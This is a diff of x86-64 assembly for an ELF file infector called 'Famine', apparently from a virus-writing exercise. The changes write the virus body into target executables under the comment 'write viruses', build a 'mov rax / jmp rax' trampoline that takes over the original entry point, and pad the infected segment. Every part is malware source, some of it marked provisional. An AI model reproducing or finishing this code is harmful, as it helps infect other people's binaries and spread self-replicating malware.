@@ -164,6 +164,8 @@ elf_phdr:
 patch_segtext:
     pop rsi                                                 ; PAGE_ALIGN_UP(FAMINE_SIZE)
     mov rax, [rbp - 16]
+    mov rcx, [rax + Elf64_Ehdr.e_entry]             ;tmp
+    mov [rsp + 2], rcx                              ;tmp
     xor rcx, rcx
     mov cx, word [rax + Elf64_Ehdr.e_phnum]                 ; n phdr
     xor rax, rax
@@ -223,29 +225,24 @@ mimic:
     syscall
     cmp rax, 0
     jl clear
-;write header
     mov r8, rax
-    mov rdi, r8
-    mov rsi, [rbp - 16]
-    mov rdx, 64                                                    ; header
-    mov rax, SYS_WRITE
-    syscall
-; write viruses
-    mov rdi, r8
-    lea rsi, [rel _famine]
-    mov rdx, FAMINE_SIZE
-    mov rax, SYS_WRITE
-    syscall
-
+;write header
+    write r8, [rbp - 16], 64            ; maybe change
+    
+;write viruses
+    write_rel r8, [rel _famine], FAMINE_SIZE
     ; NEED TO PATCH ENTRYPOINT AND WRITE OPCODE x64.
-    ; mov rdi, [rbp - 16]
-    ; mov rdi, [rdi + Elf64_Ehdr.e_entry]
-    ; mov [rsp], byte 0xb8
-    ; mov [rsp + 1], [rdi]
-    ; mov [rsp + 9], 
+    mov [rsp], word 0xb848          ; mov rax
+    mov [rsp + 10], word 0xe0ff     ; jmp rax?
+    write_rel r8, [rsp], 0xc
+    write_rel r8, [rel hook.folder_1], 11
+    write_rel r8, [rel hook.folder_2], 12
+    write_rel r8, [rel hook.TMP], 10
 ; padding
     PAGE_ALIGN FAMINE_SIZE
     sub rcx, FAMINE_SIZE
+    sub rcx, 45
+    ; sub rcx, 0xc
     mov r9, rcx
     .loop:
         cmp r9, 0
@@ -267,7 +264,6 @@ mimic:
         sub rdx, 0x40
         mov rax, SYS_WRITE
         syscall
-    ;;;;;; NEED TO WRITE ENTRYPOINT SOMEWHAT.
 clear:
 ;munmap
     mov rdi, [rbp - 16]
@@ -332,3 +328,7 @@ hook:
         db "0x%x", 0xa, 0
 %endif
 _end:
+    ; mov rsi, [rbp - 16]
+    ; mov rax, qword [rsp]
+    ; mov rax, qword 0xff00ff00ff00
+    ; jmp rax
